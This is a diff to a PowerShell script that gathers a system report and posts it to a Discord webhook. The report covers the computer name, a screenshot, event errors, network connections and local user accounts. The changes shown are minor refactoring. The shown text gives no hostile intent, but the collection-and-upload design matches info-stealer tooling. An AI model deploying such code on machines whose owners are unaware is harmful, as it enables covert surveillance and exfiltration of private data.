@@ -332,15 +332,19 @@ function Build-DiscordPayload {
         $e3.Add(@{ name = "Events (7d)"; value = "System errors: $sysErrCount  |  App errors: $appErrCount"; inline = $false })
     }
 
+    $embed1 = @{
+        title     = "System Report: $env:COMPUTERNAME"
+        color     = 3447003
+        fields    = $e1.ToArray()
+        timestamp = (Get-Date -Format o)
+    }
+    if (Test-Path $screenshotOut) {
+        $embed1["image"] = @{ url = "attachment://screenshot.png" }
+    }
+
     return @{
         embeds = @(
-            @{
-                title     = "System Report: $env:COMPUTERNAME"
-                color     = 3447003
-                fields    = $e1.ToArray()
-                timestamp = (Get-Date -Format o)
-                image     = @{ url = "attachment://screenshot.png" }
-            },
+            $embed1,
             @{
                 title  = "Storage, Network & Connections"
                 color  = 3066993
@@ -365,10 +369,12 @@ function Send-DiscordWebhookFiles {
 
     Add-Type -AssemblyName System.Net.Http
 
-    $client = New-Object System.Net.Http.HttpClient
-    $multipart = New-Object System.Net.Http.MultipartFormDataContent
+    $client = $null
+    $multipart = $null
 
     try {
+        $client = New-Object System.Net.Http.HttpClient
+        $multipart = New-Object System.Net.Http.MultipartFormDataContent
         $payloadJson = $Payload | ConvertTo-Json -Depth 5 -Compress
         $payloadContent = New-Object System.Net.Http.StringContent($payloadJson, [System.Text.Encoding]::UTF8, "application/json")
         $multipart.Add($payloadContent, "payload_json")
@@ -687,6 +693,7 @@ Invoke-SafeBlock {
 }
 
 Invoke-SafeBlock {
+    Add-Section "LOCAL ACCOUNTS"
     $users = Get-LocalUser | Select-Object Name, Enabled, PasswordRequired, LastLogon
     $groups = Get-LocalGroup | Select-Object Name, Description
     Add-Table "Local Users" $users
